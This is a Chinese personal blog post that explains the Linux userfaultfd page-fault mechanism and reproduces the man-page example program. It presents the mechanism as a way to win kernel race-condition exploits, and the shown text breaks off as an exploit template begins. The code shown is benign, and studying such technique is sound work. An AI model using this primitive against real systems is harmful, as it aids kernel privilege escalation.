<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="7r1p13J">





<title>Userfaultfd的学习与利用 | Hexo</title>



    <link rel="icon" href="/github-11-48.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 6.3.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">7r1pl3J&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">7r1pl3J&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                    <a class="menu-item" href="/link">Links</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">Userfaultfd的学习与利用</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">7r1p13J</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">November 1, 2022&nbsp;&nbsp;15:09:05</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>最近遇到了不少结构体，在计算偏移的时候有些麻烦，故摸鱼写下此文。</p>
<h1 id="Userfaultfd"><a href="#Userfaultfd" class="headerlink" title="Userfaultfd"></a>Userfaultfd</h1><p>userfaultfd 是linux 内核提供的一种特殊的缺页处理机制，允许用户自定义操作，大大提高了条件竞争漏洞的利用概率。</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/flow.png" alt="img"></p>
<p>Linux manual page 提供的官方手册中有一段有助于理解的代码和一些参数说明</p>
<p>创建对象：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">syscall</span><span class="params">(SYS_userfaultfd, <span class="type">int</span> flags )</span>;</span><br><span class="line"></span><br><span class="line">uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line"><span class="comment">//close-on-exec :O_CLOEXEC 这个意思是打开的一个标志位,在执行exec时,在新fork的程序里需要关闭此fd,在创建时包含该flag，可以防止竞争的产生</span></span><br><span class="line"><span class="comment">//O_NONBLOCK为 userfaultfd 对象启用非阻塞操作</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建 userfaultfd 对象后，应用程序必须使用UFFDIO_API ioctl 操作启用它。此操作允许内核和用户空间之间的握手以确定 API 版本和支持</span></span><br><span class="line"><span class="comment">//的功能。此操作必须在下述任何其他ioctl(2)操作</span></span><br><span class="line">uffdio_api.api = UFFD_API;</span><br><span class="line">uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_API, &amp;uffdio_api)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>glibc没有提供相关的包装函数，使用syscall创建一个userfaultfd对象，返回其描述符。</p>
<p>注册userfault内存：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">uffdio_register.range.len = len;</span><br><span class="line">uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING</span><br><span class="line">ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register)</span><br><span class="line"><span class="comment">// 在成功完成UFFDIO_REGISTER操作后，在请求的内存范围内发生并满足注册时定义的模式的页面错误将由内核转发给用户空间应用程序。然后应用程序可以使用UFFDIO_COPY或UFFDIO_ZEROPAGE ioctl 操作来解决页面错误。</span></span><br><span class="line"></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Userfaultfd 支持两种注册模式:</span><br><span class="line">UFFDIO_REGISTER_MODE_MISSING:触发缺页异常的线程阻塞，直至通过UFFDIO_COPY或UFFDIO_ZEROPAGE ioctl 解决异常。</span><br><span class="line">UFFDIO_REGISTER_MODE_WP：触发写保护错误的线程阻塞，直至通过UFFDIO_WRITEPROTECT ioctl解除写保护 (可以在触发cow时？还未尝试)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>监听文件fd，等待msg：</p>
<p>发送的msg为uffd_msg 结构体</p>
<p>使用pool函数来不断等待这个msg，要监听的文件用以下结构体存储</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">               <span class="type">int</span>   fd;         <span class="comment">/* file descriptor */</span></span><br><span class="line">               <span class="type">short</span> events;     <span class="comment">/* requested events */</span></span><br><span class="line">               <span class="type">short</span> revents;    <span class="comment">/* returned events */</span>  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ppoll</span><span class="params">(<span class="keyword">struct</span> pollfd * fds , <span class="type">nfds_t</span> nfds , <span class="type">const</span> <span class="keyword">struct</span> timespec * tmo_p , <span class="type">const</span> <span class="type">sigset_t</span> * sigmask )</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//nfds为fds数组的项数</span></span><br><span class="line">pollfd.fd = uffd;</span><br><span class="line">pollfd.events = POLLIN;</span><br><span class="line">nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"><span class="comment">//POLLIN代表有数据要读取</span></span><br></pre></td></tr></table></figure>

<p>页处理操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">uffdio_copy.len = page_size;</span><br><span class="line">uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy)</span><br><span class="line"><span class="comment">//使用UFFDIO_COPY进行拷贝</span></span><br></pre></td></tr></table></figure>



<p>下面的程序展示了userfaultfd的使用。 程序创建了两个线程，一个充当uffd monitor，主线程用于触发缺页错误，页错误将 通过 userfaultfd 处理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[x] Error at: %s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span>   <span class="comment">/* Data read from userfaultfd */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;     <span class="comment">/* Number of faults so far handled */</span></span><br><span class="line">    <span class="type">long</span> uffd;                    <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">​    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Create a page that will be copied into the faulting region */</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">if</span> (page == <span class="literal">NULL</span>) </span><br><span class="line">​    &#123;</span><br><span class="line">​        page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,</span><br><span class="line">​                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">​        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">​            errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Loop, handling incoming events on the userfaultfd</span></span><br><span class="line"><span class="comment">​        file descriptor */</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span> (;;) </span><br><span class="line">​    &#123;</span><br><span class="line">​        <span class="comment">/* See what poll() tells us about the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">​        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">​        <span class="type">int</span> nready;</span><br><span class="line">​        pollfd.fd = uffd;</span><br><span class="line">​        pollfd.events = POLLIN;</span><br><span class="line">​        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">​        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">​            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">​        <span class="built_in">printf</span>(<span class="string">&quot;\nfault_handler_thread():\n&quot;</span>);</span><br><span class="line">​        <span class="built_in">printf</span>(<span class="string">&quot;    poll() returns: nready = %d; &quot;</span></span><br><span class="line">​                <span class="string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,</span><br><span class="line">​                (pollfd.revents &amp; POLLIN) != <span class="number">0</span>,</span><br><span class="line">​                (pollfd.revents &amp; POLLERR) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">​        <span class="comment">/* Read an event from the userfaultfd */</span></span><br><span class="line"></span><br><span class="line">​        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">​        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">​        &#123;</span><br><span class="line">​            <span class="built_in">printf</span>(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line">​            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">​            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">​        <span class="comment">/* We expect only one kind of event; verify that assumption */</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">​        &#123;</span><br><span class="line">​            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line">​            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">​        &#125;</span><br><span class="line">​        <span class="comment">/* Display info about the page-fault event */</span></span><br><span class="line"></span><br><span class="line">​        <span class="built_in">printf</span>(<span class="string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);</span><br><span class="line">​        <span class="built_in">printf</span>(<span class="string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);</span><br><span class="line">​        <span class="built_in">printf</span>(<span class="string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);</span><br><span class="line"></span><br><span class="line">​        <span class="comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span></span><br><span class="line"><span class="comment">​            region. Vary the contents that are copied in, so that it</span></span><br><span class="line"><span class="comment">​            is more obvious that each fault is handled separately. */</span></span><br><span class="line"></span><br><span class="line">​        <span class="built_in">memset</span>(page, <span class="string">&#x27;A&#x27;</span> + fault_cnt % <span class="number">20</span>, page_size);</span><br><span class="line">​        fault_cnt++;</span><br><span class="line"></span><br><span class="line">​        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line"></span><br><span class="line">​        <span class="comment">/* We need to handle page faults in units of pages(!).</span></span><br><span class="line"><span class="comment">​        So, round faulting address down to page boundary */</span></span><br><span class="line"></span><br><span class="line">​        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">​                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">​        uffdio_copy.len = page_size;</span><br><span class="line">​        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">​        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">​        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">​            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">​        <span class="built_in">printf</span>(<span class="string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,</span><br><span class="line">​               uffdio_copy.copy);</span><br><span class="line">​    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> ** argv, <span class="type">char</span> ** envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">long</span> uffd;          <span class="comment">/* userfaultfd file descriptor */</span></span><br><span class="line">    <span class="type">char</span> *addr;         <span class="comment">/* Start of region handled by userfaultfd */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> len;  <span class="comment">/* Length of region handled by userfaultfd */</span></span><br><span class="line">    <span class="type">pthread_t</span> thr;      <span class="comment">/* ID of thread that handles page faults */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"></span><br><span class="line">​    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">​    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">​    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">​        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    uffdio_api.api = UFFD_API;</span><br><span class="line">​    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">​    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">​        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Create a private anonymous mapping. The memory will be</span></span><br><span class="line"><span class="comment">​        demand-zero paged--that is, not yet allocated. When we</span></span><br><span class="line"><span class="comment">​        actually touch the memory, it will be allocated via</span></span><br><span class="line"><span class="comment">​        the userfaultfd. */</span></span><br><span class="line">​    len = <span class="number">0x1000</span>;</span><br><span class="line">​    addr = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">​    <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">​        errExit(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Register the memory range of the mapping we just created for</span></span><br><span class="line"><span class="comment">​    handling by the userfaultfd object. In mode, we request to track</span></span><br><span class="line"><span class="comment">​    missing pages (i.e., pages that have not yet been faulted in). */</span></span><br><span class="line"></span><br><span class="line">​    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">​    uffdio_register.range.len = len;</span><br><span class="line">​    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">​    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">​        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Create a thread that will process the userfaultfd events */</span></span><br><span class="line">​    <span class="type">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, fault_handler_thread, (<span class="type">void</span> *) uffd);</span><br><span class="line">​    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">​        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">​    <span class="comment">/* Trigger the userfaultfd event */</span></span><br><span class="line">​    <span class="type">void</span> * ptr = (<span class="type">void</span>*) *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) addr;</span><br><span class="line">​    <span class="built_in">printf</span>(<span class="string">&quot;Get data: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>综上，我们可以提炼出userfaultfd的使用模板：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span 